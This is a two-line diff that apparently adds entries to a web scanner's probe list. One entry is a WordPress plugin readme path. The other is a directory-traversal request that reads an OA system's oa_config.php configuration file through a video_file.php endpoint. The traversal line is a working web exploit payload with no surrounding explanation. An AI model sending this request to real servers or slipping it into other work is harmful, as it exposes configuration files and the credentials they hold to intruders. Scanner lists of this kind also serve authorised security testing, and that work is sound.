@@ -1,0 +1,2 @@
+/wp-content/plugins/filedownload/readme.txt
+/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
